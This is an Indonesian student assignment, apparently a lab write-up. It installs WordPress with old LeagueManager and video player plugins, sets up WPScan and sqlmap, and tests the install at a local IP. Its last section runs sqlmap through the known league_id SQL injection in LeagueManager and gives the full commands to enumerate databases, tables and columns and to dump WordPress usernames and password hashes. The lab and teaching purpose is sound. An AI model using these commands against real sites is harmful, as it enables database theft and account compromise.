# Tugas 2

## Instalasi Wordpress
1. Download Wordpress dari laman [Wordpress](https://wordpress.org/)  
![download wordpress](download_wordpress.PNG)
2. Ekstrak file wordpress yang sudah kita download lalu letakkan di folder root web di komputer kita. Contoh apabila menggunakan apache di windows folder root terdapat di folder htdocs dan linux terdapat di folder /var/www/html.
3. Siapkan database mysql untuk wordpress kita. Contohnya kita buat database dan kita beri nama wordpress
![database](database.PNG)
3. Akses wordpress yang sudah kita letakkan di folder root web dengan browser
4. Saat pertama kali, kita akan diminta untuk meilih bahasa
![memilih bahasa](1_pilih_bahasa.PNG)
5. Setelah memilih bahasa kita akan diminta konfigurasi database
![setting database](3_setting_database_wordpress.PNG)
6. Selanjutnya kita akan diminta untuk mengisi detil website kita
![detail web](4_isi_data_situs.PNG)
7. Instalasi selesai
![instalasi selesai](5_selesai_installasi_wordpress.PNG)
8. Setelah instalasi selesai apabila kita ingin masuk ke dashboard admin, kita bisa mengakses ke endpoint wp-login. contoh "http://alamatwordpress.com/wp-login.php"
![login](wp-login.PNG)
9. Apabila berhasil login kita akan masuk ke dashboard wordpress
![dashboard wordpress](7_dashboard.PNG)

## Instalasi Plugin
### Instalasi LeagueManager
1. Cari leaguemanager.
![cari leaguemanager](8_pencarian_plugin_leaguemanager.PNG)
2. Pilih leaguemanager dan akan keluar popup dan pilih **Laman Plugin WordPress.org**
![leaguemanager popup](9_leaguemanager_popup.PNG)
3. Lalu kita akan diarahkan ke laman plugin pada wordpress. Pilih advanced view pada bagian kanan bawah.
![kunjungi dashboard](10_dashboard_league_manager.png)
4. Pada halaman baru yang muncul, pilih versi plugin yang terletak di bawah halaman.
![pilih versi](11_select_version_leaguemanager.png)
5. Selanjutnya download plugin akan dimulai.
6. Setelah download selesai, kita unggah plugin ke situs kita.
![upload plugin](12_upload_league_manager.PNG)
7. Lalu aktifkan plugin.
![aktifkan plugin](13_aktifkan_league_manager.PNG)
8. Instalasi plugin akan dimulai.
![instalasi plugin](14_instalasi_league_manager.PNG)

### Instalasi WordPress Video Player
1. Cari video player.
![cari videoplayer](15_pencarian_video_player.PNG)
2. Pilih WordPress Video Player dan akan keluar popup dan pilih **Laman Plugin WordPress.org**
![player popup](16_video_player_popup.PNG)
3. Lalu kita akan diarahkan ke laman plugin pada wordpress. Pilih advanced view pada bagian kanan bawah.
![kunjungi dashboard](17_dashboard_video_player.png)
4. Pada halaman baru yang muncul, pilih versi plugin yang terletak di bawah halaman.
![pilih versi](18_select_version_video_player.PNG)
5. Selanjutnya download plugin akan dimulai.
6. Setelah download selesai, kita unggah plugin ke situs kita.
![upload plugin](19_unggah_plugin_player.PNG)
7. Lalu aktifkan plugin.
![aktifkan plugin](20_aktifkan_plugin_player.PNG)
8. Instalasi plugin akan dimulai.
![instalasi plugin](21_instalasi_player.PNG)

Apabila plugin telah terpasang tampilan laman plugin akan seperti dibawah ini.
![plugin terpasang](22_plugin_berhasil_diinstal.png)

## Instalasi Tools Penetrasi
### Instalasi WPSCAN  
1. Pastikan komputer kita sudah terinstall git. Apabila belum kita dapat menginstalnya dengan mengetikkan `sudo apt-get install git`
2. Install dependency dengan mengetikkan `sudo apt-get install libcurl4-openssl-dev libxml2 libxml2-dev libxslt1-dev ruby-dev build-essential libgmp-dev zlib1g-dev`
![install-libcurl](install-libcurl14.png)  
3. Clone repo wpscan dengan mengetikkan `git clone https://github.com/wpscanteam/wpscan.git`
![clone-wpscan](clone-wpscan.png)
4. Install ruby dengan mengetikkan `sudo apt-get intsall ruby` tapi, karena saya menggunakan Ubuntu 16.04 bisa cukup dengan mengetikkan `sudo apt install ruby`  
![install-ruby](install-ruby.png)  
5. Masukke folder wpscan yang sudah kita clone
6. Install bundler dengan mengetikkan `sudo gem install bundler && bundle install --without test`
![install-gem](install-gem.png)  
### Instalasi SQLMAP
Ada 2 cara untuk menginstall sqlmap
1. clone github dari sqlmap dengan mengetikkan `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev` **sqlmap-dev** disini, saya ingin clone folder dari github tersebut ke folder bernama **sqlmap-dev**  
![download-sqlmap](download-sqlmap.png)  
Setelah tahap clone, pindah direktori pada folder sqlmap anda, lalu bisa dijalankan dengan mengetikkan `python sqlmap.py`  
2. Install langsung dengan mengetikkan `sudo apt-get install sqlmap`  
![install-sqlmap](install-sqlmap.png)  

## Uji Penetrasi
### Scanning menggunakan wpscan
1. Scanning
![scanning](scanning.png)
2. Hasil Scanning
![hasil scanning](hasil_scanning.png)
## Exploit menggunakan sqlmap
### LeagueManager
Berdasarkan tautan https://www.exploit-db.com/exploits/37182/ , Pada plugin leaguemanager versi 3.9.11 terdapat bug, salah satunya pada parameter league_id yang tidak diamankan sehingga dimungkinkan sql injection.
![hasil eksploit](sqlmap_leagumemanager.png)
1. Setelah diketahui terdapat variabel yang bisa dieksploit, kita bisa menggunakan sql map untuk database listing. Syntax: `sqlmap --url "http://192.168.1.14/wordpress/?season=1&league_id=1&match_day=1&team_id=1" --dbms mysql --dbs`
![hasil dbs listing](hasil_list_dbs.png)
2. Selanjutnya kita dapat melakukan table listing. Kita coba list semua table pada database wordpress karena kemungkinan database situs disimpan disitu. Syntax: `sqlmap --url "http://192.168.1.14/wordpress/?season=1&league_id=1&match_day=1&team_id=1" --dbms mysql  -D wordpress --tables`
![hasil tables listing](hasil_list_tables.png)
3. Selanjutnya kita akan melakukan listing ke tabel wp_users karena disitu kemungkinan berisi login informasi. Syntax: `sqlmap --url "http://192.168.1.14/wordpress/?season=1&league_id=1&match_day=1&team_id=1" --dbms mysql  -D wordpress -T wp_users --columns`
![hasil list columns](hasil_list_columns.png)
4. Dump isi table wp_users. Syntax: `sqlmap --url "http://192.168.1.14/wordpress/?season=1&league_id=1&match_day=1&team_id=1" --dbms mysql  -D wordpress -T wp_users -C user_login,user_pass --dump`
![hasil dump users](hasil_dump_users.png)
